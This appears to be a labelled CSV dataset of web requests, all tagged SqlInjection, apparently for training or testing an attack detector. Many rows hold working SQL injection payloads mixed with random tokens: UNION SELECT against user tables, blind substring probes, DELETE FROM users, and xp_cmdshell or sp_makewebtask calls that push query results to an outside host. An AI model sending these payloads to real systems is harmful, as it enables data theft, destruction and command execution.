id,class,vector
1474,SqlInjection,/oRMosjAecVjWk/EC/5XQ8iLjfxp_binY4yY3/neAuRwlI.html?advgtCecaetpmue=k&da=+++++OR+++2+++%3E+1&setGkrUresbreas=3SW3gtMFp
1482,SqlInjection,/jow.pMwxT/rZSEyl_6Rhgp0j.gif?Qa3c=tBWmoxWOox&EiXSp.pOP=259&4aegeted=qwer%27+++or++++ugxioo_v.Account%3D%275denIae%40ieqot.com&bdidshtOrfwmsen=N%3Bchv&mrheRanIahpi=tearecit&shoFk1nxgzTqJl=a5JtZ3Nq&wikgmi=areplace0A
1503,SqlInjection,/7kN1wzF8l8Hj0rnK/6gseaax/opengroup
1515,SqlInjection,/bepuex/aHypUV_iQIUme5Ih58/uH6xltacletceAreugA/rRrDOm@GEGrJI4.php4?Uopt3tWprocessing-instruction3RBPimgB=%2Bd%25u&cntapone=1r%3C&osock_streamobq=d%27t&heeno6g6u=OR+++%27seuansw5%27++IN+%28++%27++%27++++%29&snwe6q5ib0=%2Biu%3B
1517,SqlInjection,osz=stmstGut8uhrAnv&titu=rji&Inuniecneu3lo=tZSwe1&lhcVtttoad=o&nrrsct=5384563&erstPypummoevc=6424&ts8B2=26&so=etckmn&al=96221&ozyh6=rtepaesqf4ss&havingHhavingwhereWDBU=wfe2nmnubjt&6h=qtToennhelst&kYMWj1aW2=tpeth&tt=a6
1518,SqlInjection,/0uraverd4suh.tiff?sAsu=97320861&sNs=ysakcekLinserte%7Cneo&A3e=bsnxr2i&46xhssiot0t=misy%24&Wyelog=nullil&rtpahalquBwawf=d%3Em&tT=iteeo85rol
1529,SqlInjection,/iek.OkzBcl4O3L10/QKDqmochaVF/izdJlyu2J2n8nI9ug/5aDchildbetweenGhKLbg5u.mspx?Baq=+boot.iniMoy%3FsS&ooet1ee3tvoc=8044&nfneu=Tibnoptxtermtj%40hu&7ve=1&vtusgzeet=1&lhifat=ecrN&2Bdkaeanjasn=752&alctvoEnyoOnsj=OR++++%2751lwlfii%27++++%3D++%27++%27&ohyensaif=emlexec&crcwnfaShS6hd=9gel&senust=+%7Etianytet1ohesuttt9&o5dqji5usaty=betweency
1534,SqlInjection,nmn=7ibmNeetonEail&l1mOo=ddxTb&e56u=65874&te=da&jz&oepunan=la7oinclude/rb0td&geos=Lebetweene
1545,SqlInjection,/evnqlxbwEk.aspx?ihY3Eonr=34694&in3ynull=0975&uyDi8=e%2FHoeavAerhmluhome9kgP&maasea=V%40++tcHwindow.openteucnc&6pusrupdateZ=abh+t&Ai=OR++++%27ft%27+++IN+%28+%27+%27%29&noemnedt46iiwce=tofdaksaeoIf4a
1555,SqlInjection,/jc3/avX4SBOZ/oeujs86hit/varQINrRtqWY/Pitrno2/Ywindow.open6nH2CP@53jt-v/child0xh/eK6VcRy.mdb?uvuH=997&ee0emrkztadld=5216&m3acgula=i9SXQ6q2pRT&osiifaer=nun+%24&paus8ndep0lere2=8762812586&2o9dxNu=%27%3B++EXEC++master..sp_makewebtask+++++%22%5C%5C13.47.94.224%5Cyi%5C6heue.css%22%2C+%22SELECT+++++*+FROM++++INFORMATION_SCHEMA.TABLES%22&eristlq=%3Br3o2vyhtacceslor6cy&5oe=oe%26&cityade0=neos3uenecen&tIrMMI@cat3ostdin=rC9jlRjV&ohNrtFau=o
1559,SqlInjection,oaihaeoapzdooer=:x+bK&raeslldiyeCzicf=183438&adpSaesbf=86501842&2blsnnxdc=libesRg&hlUfo=hmx/uoantevalrn $@ssock_stream-<&s3aqe=cZht\e&7hi0i1wsetmrsz=yPns949i-an&oiy=5&tmsctispbt=dlAfaowm&ce3ls2=lzIU6i7Xxv&itpapwt3uceq=9751727741&oprw2no=e
1569,SqlInjection,/bN7y/y4r6goo9Rion7dnt.nsf?a2AKIaer=n%3Cdropi%2Findt+&3SqB@XUX=wahttp&idInndta99st=nZlD&lbtteEb9ySd=+namanet&ZYc9=tiTEfejgsin&tCseo5=773993&edtohSeeemyrpep=qwer%27++++or+++vx5maa_v.Account%3D%27vpi%401ee.com&tsenekasntaaedE=6&edat=steswinntsTopny%3DpbaM&rtcb0rdiutuxdIs=esi
1576,SqlInjection,/uqC6JG/i1ast6Oyt0MpXgnU/Yttaaondtt/0O@rsAu3D1iI4IHh3/EihstoOgnt1aP/upAfVtx7kLI4J/m0C_v2C.php?ceUnbn=%27+OR++%27lqolo%27++%3E++++%27S
1577,SqlInjection,/ateQE@Vt6SQ0p9x7A/e.8TyijyB.RVFheai/ecamei2tahLeot/y511QjM2UAp-Tf/lk4GTrnutrosehe/5ttd/kc/skelt3Psntprrt/Lbgsound/im7ehdai1Ztzlisr/tA8Jmsw5mgEMO6SG34/whereRD4t5Zxinclude63S.php?objectuRy7V=oi&6imbCboro0t=ddptos4zl3i&ss1Elt=chairs%27++++UNION++SELECT++Oa5rezhhox+FROM+++++dba_users+WHERE++name+like+%27%2525
1590,SqlInjection,/n1pLp5fW/6mileUwateciatesBtn/thSb/jservicesa04divN/Mk9DO_V/@-3GFnqf9DkW_Uq/iSmW42.png?stfwaqn1=65755&8Soycormxhe=7345&sjraDkl=%5Di%40eaa4gede+ivaaoh&dhsa1qboal=76693609&ctasts3meh=297787302&eesnriirehieiW=woiievalor+&NAB27M=2&wzYzmail1w_Gw=9&lzt00yf=058516433&8gan=lesguian&sQ5bFw4YdAwO=gK1vlSV3qZW&n3ieeFyzptShst=%5Dig&TiZt6fe1Tia=exec+xp_cmdshell++++%27bcp+++++%22select++*+++from++caNT%22++queryout++pwdump.exe+++++-c+-Craw++-Shackersip++++-Usa+++++-Ph8ck3r%27
1600,SqlInjection,/oRmbmKY/6lJOsEWhdsxeAPfRl/e1.Bjr4S/o6SHXoge0MzeTRQhSF/CRa8gXnodeAinclude2Rc/ikeaRhsXs/iGl/o3fyt6ZE0XENHW78/nipZ5w/agroue5dS7icsacEn/owMYzWPJ/h8EP.png?zwd=onibijnasehabchild&ftpvqoaC1=2300090422&eow=7i&gmdrmseiooiho=wsehred&cDsf=4882590&otgoaLiMgAo=s7ior4nlmrizhnhvt&IadWoDTWjMw=eq%26sao&weDyMh9ottns=1&t6hrEezdemc4nh=ins4&a9=099184107&MTStxkvbscriptTpFi=Osssuae%27+++%29%3B++++DELETE++++FROM+++users+++WHERE++upper%28username%29+++%3D++upper%28++++%27admin
1605,SqlInjection,/allhRgAEimwhere8passthruFZservices/khozugOwe/1L0htpassO1p2WRA/utsaiut/bc1y41y0avmghjqglt/Weqm2noUQoeecgodz/jnQw7/nnM9Xu/ilognahETgRk.htm?athurt=du%40s&umUffoea=dtdhDeqdlh%3Eh4node&welff=i+nE&ey=%25&eaief8rlureYakU=nluc&StlimLc=5&bdens0oEnyst=Atp&Ulogexml5Iqlocationg=%27+%2B++++%28++++SELECT+TOP++++1+3wsu+++++FROM+++esrrpo%29+++%2B+%27&Etelnetdoeh=+jnaitrUovusqth%3E&nrxQF5s=hY5E&ktrolr=115411&ugeerl=9288707712&lt=0699&Ozpere=bdrj
1612,SqlInjection,/ksTlsyarpecwAmoIz/_S._4DTpositionvHaQ5/hN2KWRs@jln_eUzs3/Rr67qdibe/iflO4msy9ecmre/cPhOBs9QXNcn/etmftansreOh/tatexsuat/fHTnrVkYFbcG2Q.html?y@fIVbody.DF=itn&ioc=7&B4y4fRyG=88852678
1614,SqlInjection,roo3cH6auhlhieE=H20nqlibaen3o3a&jIo0=4x&dIi2nesTb=hJAyoY86FH&SunionVc=894666&liar2ddaatl=sIKOZPh0KGC&sepamd=[&otpnobaaaIr=y&seqr=iaaccept
1618,SqlInjection,hbrwen0=ccH&_dOoF=g&motjeriwbL=5&Mrz01yb='  UNION        ALL    SELECT   4sYIry     FROM sTnisj    WHERE     ''    =   '&eeeOaoutC9xd=tdir-Mtp
1629,SqlInjection,/wErkevI.js?t5t=t%5DB&da=8146751&etek2=eo9Ltesaamrh7kh&y4er=r3tHne&tTgRn4otrse=ldottt2isiri&Jg3@DdoB=t9pLard37iaE6&utiet=73bXbThFD6Th&7i=Tm&l2pshthic5aqo=00&oumj=525425103&ge=2077320&n617sthaho=%27++++OR+++++%27Du3rfwxott%27+++++BETWEEN++%27R%27++AND+++++%27T&xoroe7=20438&mm=3226877772&7rb=gneoSufzle
1632,SqlInjection,/itoggejk0nI8ees/n0wfeysUqlgl/mffg1cbIxFL/C4m0/ZVinclude8kgMt/AFhe3YHwfoJ5imgj/aV_EL-r@S2mx4/ei.tiff?0tusieefUttof=OR++++%27aTNju%27++BETWEEN+++++%27R%27+++AND+%27T%27&edntc1Ustee3ho=9363876&vinputY.openstdinlh6lsG2=%3Cufwts2qcpin%27r+c&iqzezoren=p&um3e=31&6dnetrsbeedrWmt=usrl%2B+ilm%7Eb%3Ce&t3eThkD=eEylsgaptmwiinas&ndeh=ntiaa&eeu6ir8hmTfef=aei59ts%25i6i+rhx%7Eei&TdoDiprieu=iettm%3F&RutXnR0dQ3=eSRx9
1635,SqlInjection,/stqVv66@D1qrzhQsIM/4gfsa4ntonafoAV/aoyfeoh/Rl64aSWkCWTY/is@XOmYThr/bf5vWs6efts6g1k/kHFovqy/Foexecbu/f-ZbN/tU-styleimWMdnHyQA.css?rElzeiotfi19=hlohihbehttpsrh&ac8tuegib=07005&mi=nXx%40C&hosomtbs=8448&Lku4q05=eJ5l6BZUUa&hims1znqnRt=77652&oixhtmnd3ereimp=162510&0n=%27+OR++++%27soaa9e%27+++BETWEEN++++%27R%27++++AND+++%27T&Hor0D=rnsii&etcuIkX8z.rxl=rHds
1640,SqlInjection,xttioi2Orrcir=5&nttavbcaqs0CTeE=iii-oe6netcat6pm3I6k&teced9=lbZ_&DjkIlSlocation=delete)2Wsaf5&hehe&eraeb=2binns&un=y&fuon&ir=ionr&tuhKPbconnectHrcopy=t6be1ceCqphprnt&JR0fscript=stk
1645,SqlInjection,/octguworyodnnDba/mPBSql/I0Ydi@vhHxQM4mk/0rjamiaeaSteetidE/CZyvW-zp/uifO7S/JoptZNJdiviGeXoHX7/tEAes/fi0ewkdmmwnvayd/tF7T@/ee020ewhfuyhe.mdb?ytyukle=itonosten&eZopene0VT=9646836&mr8T=tsarThlji&elydCudsttoau=u++r&reuAEdhta=njwindow.open&fulzbd7ee=nSf_WLgp&ihypdg6emo=357684586
1659,SqlInjection,/tSoocreeCo9Angzer73/3srlMc9pIdSeEeeesr/r_/t1mLUho/EitlgbmyS/tpORIkmT@_9yVBzEb/nWGGreF69e73pqNXo@iN.php3?iorn=OR++4%3E565838778854&puy=318&fHineuxlel=n%3F%3A
1664,SqlInjection,/txtX4n6Qd7/fTF/dytqHJlKvUDreaZ.exe?ssksnaysic0=45&TDbbeoVhthfit=and+++0%3C%3E%28select++count%28*%29++from+ntibiE+where+alonnrr%3C%3E%29&rarioomyen7fy3=htb
1668,SqlInjection,/39ol3Rx/nMf@v/s0_fY@iytrENW/eq.HbQIqL9xO5.jpeg?rueralotmk=lq4RngC4QrRJ&iuiauSrmfz3co=2250229&pv=456&wyoAuc=57&cLelh=646908&Ioteoainliogo=exec+++++xp_regwrite+%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%272tiowPwEEd%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27&rg8iiEngapnoh78=csP
1679,SqlInjection,/wtmmwedearaer/gyihv7joEbcsehrfiitn/nttorspls1n/tsndNectcE2N/9azXG23Nuz/9bfv-IWci/c2orOgi/E@O/lp/DqfqlinkjIu0/Y8Cj1asP1Wp3/oZv.js?twz2ncrkRqe=in+&oiaeDgxp=Das7m&oDatd=desen&rcse=xc9setsnn&oaopw=%27+%29++++UNION+++++ALL+SELECT++84%2C0%2C949%2C271%2C424+++++FROM++t9Hyrhuddt++WHERE+%28++%27%27+%3D%27&Xi=0Hhh9&mafroumTucanu2=wblocationb&or4iIymoahrzu5b=Ur3r&n9m=98002
1697,SqlInjection,/eNN3e-br/x5k/le1jx1JL4pz_/zv/Oopen9.LC5@ygjZum/fy3EpH/4Oaa6Tv0/ollwneiaot5/7ncxVBjopenopenYO/eqWUt8c0ubP2fjTW.exe?rottrteje=%27+UNION+++++++++ALL+++++++++++++SELECT+++Ed+FROM+++oi0as+++++WHERE++++%27%27+%3D%27
1707,SqlInjection,/40pps_.uN-r/a3iSF9L/nr/e8KyJ9WOWQul3mluj/rmjPWHwyvtwinntAwK.P/heEt/ealeolemhfT/iMadet5ifxacd/qhwWnxGjLby9@0-NeGCE/Ypusr7nph-2Pp_.gW/tuw_efB@C.jpeg?hmt=171651&W0fZseP3tmp=049265&eiu3nuonr=cf%7Cofa&smToa=l40bsmh%40n&eioiloaadsmqa=e%40DR%40U&neuihpdnsea=%27+++OR+++%27ducnsMew%27+%3D+++++%27msRc%27%2B%27icelj5t%27&isqa=rIL%40XZ8v6&rhva2d7ti0si=lnr8aNikesenutdluH&Ceyca=BApaPk2dcsI0nNoiu
1708,SqlInjection,eab=5727766&eeyhutunetnes=0023&0s4wtr6=8&znsgdof=tLgiewns&dropESdconnectR1WJ=e(8\ts&bBNStkdhA7Uexec=ee&obt&nlim=aaoed'/**/UNION/**/SELECT/**/tpn/**/FROM/**/dba_users/**/WHERE/**/aa2lb/**/like/**/'%25
1711,SqlInjection,/Gxwp-AQrdTPs/ytoatos/y6hd/iEu-5Hcm5ImayMLY/31n6-C/nocoeO/ahrs6ysls7tmdwlnsS1v/hokyD.KD6fhoAfAM4j/acue80o/etc.vWQhtaccesCcQj0C/n8-uT-g__@8d1P4nH.exe?rta0r=S%7C&oLmrva1=e8s6hjeTmgiL&saeuboeznee5jt=tXwJA&nhaotaeqn=+p&iFdeweitev4ton=%27++++%29+++UN%2F**%2FION++ALL++++SEL%2F**%2FECT+%276bs%27%2C49771%2C520%2C%27n7ffroee%27%2C9+++FROM+tnResiu+++WHERE++++%28++++%27%27+%3D+++%27&snebibNCea=72009448&ojdiixtaheig5=kp6eterlxeey&rnlon2oha3=nNee
1718,SqlInjection,/FH59qLv_h/hC5g6_/andvkt_NxmlX/6EkTUF5k8ouji3@1HN6/ntC10dU6I/ar/fj/wDAH1RSlPmf.png?td3wdmosaeu=%27+++OR++%27%27+%3D++%27&uRjXRoVc=56185334
1724,SqlInjection,/sm0ee/vtYjIwl9oq/e93dtonj0tglTws/5VD/i@x/tNkz/vagethstI6i0nre/m9UVI2WAWb6N/kuAmTP9a3_Qtgx2zf74/MabD7S0aJ0aPwAw.nsf?Gsaoc2wRn=nyxwcnsrboot.iniat4m&5p=1238064215&ae18o1uhuu=1e4doieatevurvelPa&odbrrAeahvdhea=5qZRd%40Td&e7f1Eeo1tef=02663388&mi7loAshbtSd=887389&mldnnmcf=%2Flexec%24%3C5a%5D%26+libhaving&ruer=08851044&aroaoN=r0q&nd8eieetNlta9=u5JmYTIYDJ0&EalXt6lLeRh=psgftyprENv
1728,SqlInjection,/pHj5/2rosaoentedNcnsc8/u_MtMq8.cgi?nrcip8tdO=u%28k&nssa=%27++++OR++++%27ElRnnh2%27++++%3E+++%27S&nssIItstdatito=h+%3F&esAs8nqrn=o%2Bt%7Ckx&ibtJuanacotca=6fh9o%3Fnhcer&RpTJiRbLNS=534&ev0atOln2gthd=g5ts9eEwd9ahfnebos&adgcolrlheTn=etddiEhsge2ie2h&nbmTytEM=kVILZ2&inYJB8DQtelnetqM=p++
1736,SqlInjection,/rJEGrmq.shtml?utorrrgebatt=htpassryehsetarcaee&Iclnbeeer=ielN+R+olcftp&jGLn=f&o7h2eHenH=weblmdasai&lqThKlog3GN=eymetaticmiQl&j0l7iQ1@=tioiaeHhAeese&msitsa=ial%3A&wvohsz=FnT&HCXnnc3c3fbp=ue+samssiei%28bt&om=+OR++2++%3E+1&jdSsIsOs1saheo=eNoDY9yGP%40&ulBkaarw=lefelezdrn&txyjucsrs5k=spdKL
1741,SqlInjection,seTet=laut&bh45JWP=lnh- phth  ?@Qh0&hnfT6e5aee=t4IT &kbodyjCyXprmphpWU=a7a&QcmdeJdivQZIlikei=oa8zces'   );    DEL/**/ETE     FROM    users   WHERE   upper(username) =     upper( 'admin&amtPn2So.U=ccBoeA&5wovaP5vhttpV=rais&dt6=a)
1761,SqlInjection,/hscpuae1de3iaTdcs/eeymtigdSMttesuMsrem/lvub/YVMLmA/UAroit/iumbf/ivT0Ha_x-0WAxdoYrmF/rFZDO6hQ9mBpbecYz-.htm?zlJlog@u@oHXgB=odereplacev&cPfDQm=see+h9upv%3Fbcxp_ilndcqc&@IPZL3optI=ryC_.wNX&thesj=33498622&gp=wcpinna&ysh7pelts=17&nce=78802802&esdirp=e%24o%3F0%25uoet&adminn5htelnet4r=2&psis8x60wz=Hhrie%25maili
1770,SqlInjection,/nnVangt2heistza/aH-INQJE/1xkaTp0fyn/1Vw/msi9ate1KagmobasIwte/bAMR/idiat/atQscN.mKLS0iic/zas.QMtp/7svxAleahiR/tpNCQCS8a2SE/seaeheoe6d.cfm?neoozeI=76&nco14il=icoteZceo&twuQaaqres=uuauemaasnres&oodighd7et9me=OR+%273rpsscie%27++BETWEEN+++++%27R%27++AND+%27T%27&nzi9oIpehs=Torwoheo5&gP4C9AiXpand=rY%408Y-Xnhw&o3dourijf=664&cuny=cmdh&ubs=+amseetccIFyyoss&s1eeeaFhkrneo=wo%3Ee&TFJc_p1IckF=ut7h&ehennrcsc=d&is=eeC&rs5r9se2=3aooeT&7FVgjr4Qur=413
1775,SqlInjection,/Ao7aWCexecQ33-/pE/imWBywH3d@0B-T/tu9dyQ_SQd/2gaFXSA/lL2R.9_q/9ezBcKetcFY/mh.cfm?UJTgI=4255&cmNOe=ncd&ui=sv9&gRrln3=iwphs&La=%3B+EXEC%28+%27INS%27%2B%27ERT++INTO+++users++++values%2883%2C%27eoPeyv%27%2C%27anthe7ic%27++++%29%29&r7d0uaoeaheaIOu=Onmgn
1801,SqlInjection,/passwdCPI_Rlogkk1etcNR/zlvioihioiraSogiNs/wQagGb/w6objectrM8hlYacceptq.gif?13eHnsotv5He=957071&ujh6cmfr=ouNXrT4%40&tioftbisber=18702&W2ogafrqf=tJPk84qyU&bia1s=ay&9qHautoexecWDhL=%27+union+select+sum%282nus9so%29++from+++++tadnOr--&edvnticsdpcfd=uha.gIUi&tbetealnTbta=nfwaon2cn&0l2o=11&4mellpta=1544&n3samrI7QOe.@=rwoeohldegmsn&rtenh4h4en=5%409dbL%40&rNtto9na=+aisl&kobs5=676&Lt1sr=49904874
1802,SqlInjection,/lO5vun1in2Rb3FxFeXW/tm9/uyiiN.j-Z03J.vbZNv/snayeeiIo/bA/ei8toen/v.netcatservicesFAAGWvAb/oeEto63ieE/afnnoltdroaIsc9heeN/v092XI/m4lhnfoeoana3a5narnt.tiff?ttw=%27+++%29+++UNION+ALL+SELECT++0+FROM++++awBtd+WHERE+%28++%27%27++++%3D+%27&xasinrt1AOsndas=Etstnoes
1816,SqlInjection,ERk3=n6olpbirifohaauv&nz7=scriptahtaccesaT&fhfhnelifeo=';EXECmaster.dbo.xp_cmdshell'cmd.exe&eRCtseZnry=bwmsFi&ttr=fs+&wteoEnuwrvz3=t3aN5nRw&6uhyhhteghlnlfA=hcAnEoi&TMSIqPeNBsusrw=dc/o7&eyrloy=184&homelUmscript_=ehe&rnboheh=4%uNl=cs Imaili44adminhvk&mfneERahltlcea=3723&VjoaoEtmYat=s
1823,SqlInjection,/t8JS6fDPIp_HCi/srwE9QE/osr5hazT5actIt/ma/khddgsErsta2w/css/ZLNB4G12/meHZ/TEBaccess_loggz1.XGk/6JIjobjectid0sZTLc/cmwgyZJ2K/rCRMw.asp?iohsenasNen=4023&aa=+++OR+++++2+++%3E++++1
1841,SqlInjection,/uAG-f/pMeYsdaEbWO_YGs/wgetselectIW4/hrnk3dimc/n3aurOkonpaov.bin?hhb=p+fi&rzuddng9rtn6e=543213&CnhpO=f7sfamo&eonOidNhtsnwu2w=v2qvso&zicmdDVQ1=0&catijsock_stream8X_NvGis=lixr&izu-4=wei&oh8jojnddor=oeg&pz8GIsya1LrR=wtbowinntpAnetcateupdateujr&yilrYbeibGnmamt=60070297&riunr=idcsock_streamlinkwl&xt=r0r-&msn9bn=jnvnyraohs
1844,SqlInjection,/ePetnt43nIsipO5/ltssssAzuz/eCoIg_DJI7RF-Z@/xcerd/vBpOHsinclude/l9itssxte8/v0dfl.jpg?tlG9dt5eyza5r4D=rF%3D%5Cn&oCdnruttaa=anoowhtipagul&tee1uuei=+&Fwd7eyimY=noidvscuIaTZsLsan&rcatbeinntc0y=oad8tu4TT&tt5ro8art=rabzh9mmny0sc&luese=4630818&aynntj=518714&esswotOtueeevT=%27%29+++++UNION+++ALL++++SELECT++++lee+++++FROM++++vsgnjl3en++WHERE+++%28++%27%27++%3D+++%27
1846,SqlInjection,/aroFbtodoseoeru/amp4@M6xHJxfMdkCWf/rTEGcUFpI-XP/eDroo9hHsrETnsal/ever5G1ijdnffsi1snIA/SSRGjV/wn@QweOto/tE/fedr.jsp?stleYnomgp=iefs8gmThVomd&rnbw=6&lzj1m=eDY.HTf.hh&mse=am%25l+ee%5Dpp%2BuskU6HS&7bOah=e8ynrte&HNIY3wRCJ=OR+++++70505%3D70505&Tnnfhgdllst6nei=g+r&se4Thitfhdsine=aUvm%40Ta&nyiniLohe0ahtas=2tawp-&d9n=rwgs&0ijTinlRctsehu=inti&ttlG=eMvM7&oSd=evpR4G%40
1855,SqlInjection,/4eXFrFhncJ/dF1u7PAaDNWn51f@Cwe/OdbetweenbJ4/Wogoiupfes/I6_5bTPik7pGN2y/niohseqhwshsng2ao/mLHfR-3kuVV.S.sh?7EnlzX=AND+ascii%28lower%28substring%28%28SELECT+TOP++1+++eea++++FROM+sysobject++++WHERE+++++xtype++%3D+++++%27U%27++++%29%2C1%2C1%29%29%29+++%3E++++111&ptteeiatLg=4382&ianSlt3iHf=t&qwrci=37&5nhtneaQ=toX1fie&ehNo=84401&5lgmqrr=039327&asw=v2ahhwmlaydzsUesl&tu0bKYnzA=%3A%28idudbinelmoi%7Cnyehconnecthall&oRlr0ovi=wX8CbY8&dfdnvadhE5pfe=7314&j6v4TyFem=10968&Efte6ethEao8LTh=78&ej=24236186&iaoep4h=etrnopthttpsr+%3Dfvarmsshp3accepto0
1864,SqlInjection,/nycadtcg/HgePbodyu/omxarZMM6/MBkEtQOdphpoMaTsystemz/1ssmrEhcn9fey/reEwRntzifna/nE5ahq-jh2jS/dhtaccesRkDhtacces8-MVoCMz.htm?crraot=dsn&4vbdlo5=imazlio%3D0d%5Cfj%26ote4b&CZHCmC=j72QOip&gc=oehcp&tCaocr=9831767&rcgtah=v&rtiR=AND++ascii%28lower%28substring%28%28SELECT+TOP++1++qgjyd++++FROM+++++sysobject+++WHERE+++++xtype+%3D+++%27U%27+%29%2C1%2C1%29%29%29+%3E++111&ihvst2botCae=sd7drrcdttYde&qstdinkrM=I%5Dtjikn&1SSITe=ceH1cr&epin6qi=66&MIbnT=8461&ahjp0q6=gsbQmi&90ueEgfeah5talm=suaTr
1866,SqlInjection,/y9UAmy/q0J/6MhgT/ty8e4sZaTTt/zbGAU5/nbENrkqjUT8x@gVOOb/h41@uZoM9o.pl?hcufur=TtTKweiprws
1867,SqlInjection,/oDan/netcatJsGid/dorp3drK96/l99NV.aspx?redyveWwcStnk=oe56%29kea&nrdttinttdisn=nA4U&oeit0h8tpNe=8344&hnti66tog=6259340&ss9El4ne=79954&ies7rneum=4934&Ct3sh=qwer%27++or++oiby_v.Account%3D%27Ch2i%40ruatf3.com&jeE=69754&anNbilh=Rhf1tn&OEPideleteW=43&590sm6ohrhrt=09036&mrElk=cesg+n4systemflktos&ct=61617&dl09pXitio4kjc=3694191133&airenenetmnsv=aem7sstelnethna5N
1880,SqlInjection,/nxJA./wbf11F_6-1RC0p_sR/vL8Wrk_fwKq1AAL/eGo/fPcjcCydtLmC/qr@Oo@PFsm2Udc.bin?bn=9333775&oemacq5nos=iiu%7C&htautysqlgsisM6=osoLpagsNsa&qsaoaU8yfo=ea6acf1AF&t5rmO=2074140&qaf2otqoss8s=processing-instruction%7E+Ho&M9WBGR@-p=Gtiob20oni&ttA=2738&sltm=4744676&adu7=3ie4atmna&waahp=erqaeqdxeMlhisehe&it7oupshlst2=167755
1885,SqlInjection,/hZTfgKPc4lT/3oLzkpkq0vjIOEls/nU1HOzL422R/DieawplnhEyoseima/runlZDjEbQ.msf?in=%27select+customer_phone+++++%27%7C%7C%27from+++customers+++++%27%7C%7C%27where++++customer_surname%3D%27%27%27%7C%7C+lv_surname%7C%7C%27%27%27+++and+customer_type%3D1%27%3B
1893,SqlInjection,medwan=63&bodyq3XvE='    );     delete   from users;  commit;   dummy(    '&tamsq=nEhttpsEca+iowindow.open&urrmsayb=trehsl
1905,SqlInjection,/7wR94/uTe5/be14h3sdoh1eai6tt/zdhm/mos1o1t/q.x@5jVkSUMd/fja/issOSF/QO/eMJw0L5-nRq/vS@ptJt/ABstyleQEZNgcatQH-.js?eeuihtdr2nBRid=etearAs&7oco4qtlr0oesxi=18685245
1926,SqlInjection,/isgenlhd/y4-eQY/coasiihiuiaM95/evLbW9MMix6On4zk/ia/0emtfedsr/aetceqnnt/wrdflla/xA5rpp-JdhUpaF.ka6R.jsp?HTtmpg3JopenJ3=%27+++%29+UNION+++ALL+++++SELECT++matuBa+++++%2C+ckjt8+++%2C+++ypiiohcn+++++FROM++++9nm++WHERE+++++iomvt+++++NOT+++IN+++++%28%27esu7hwquni%27++++%29++AND++iIvGn3++++NOT++++IN++%28+++%27tel%27++%29+++AND++%27%27+++%3D%27
1929,SqlInjection,/dfj8@ZI-/cb.bN.X/fA2x0RONfHF8/vbscriptfstdinssreplacee4aGupdateQ.tiff?eulOis=0&R79htacces4Bposition=26188&lstSadhoil=hf&nbEcmrze4o=s6pnochildephph
1935,SqlInjection,/tb8iIIe/h8Y_XXtihdFPJQn5Z9TV/hsgaoegkaAumrEssHm/plnaotlEctlon4l/eaSth0h3/epn04Xs-ZFUBgFg/W1Hhtrcpvr4T-4/ep-U1rgBEkEk/eOhr/ea3qObnuhbi3bnnRwwg.gif?tA21ojqS8da9aen=g9g8cn+y&QLvuIK=%27++union++select+++sum%28saqhelEf%29++++from+++++C4ai5h--&s1yer01ezoHt=osystemef+hIop&fclrTxpgt=y7t&8tamstgt21sznnl=%3Act%29t&amerdeypader=xCSn&arawYidiaenf=aqznkC%40wE&ln5oso=+eorwda9e8&cuniOT8eua=6587414&httpsKwindow.openiab2AWw=v9ke&duta=nodekbstdink8qdi&n9y=7026&sh8u0dyot6ent=8060085
1936,SqlInjection,attsrtsfsdtdsti=2268424&0afvxL=nVO89&e2smmo2e2c=pdSetosisv&H2NRVd=7&drlziehbu6ieg=5Juk9jM&me5tbvoa3hto='     OR 'tohnk3'     =    N'
1944,SqlInjection,/ksp/Tlh9tuiEres2/adtnltwmsmi5da3slw/tk5OBE1779IJEIn4V/eopsEegzgehie/s9ateegscnmagEoooh/hMYCPzrpILPh5yt_vaQx/twgor/iySh/aas.js?lrvdsceesh=shutdownsAb%3C2s%5DtI%3A&dtwrTnDhp=mrol+hcmdrge%27+otCtsinput&4hpyW=chairs%27++UN%2F**%2FION++++SEL%2F**%2FECT++ea++FROM+++++dba_users++WHERE+3drTdt++++like++++%27%2525&knet=3113&ioelgdha1ebii=7114779517&ta9Oi2xiann=243&ZtWpasswdHew=loggietc&noO5ed3ut=5ZInzNaoacrgBncg&oxniXd=+ba&senhueba1nLSYwc=8751&el1sbretrnn4=snGscr%27c
1955,SqlInjection,/tfpUGZ97vA@xAm40/Uh/Oraiaibhsh04.gif?
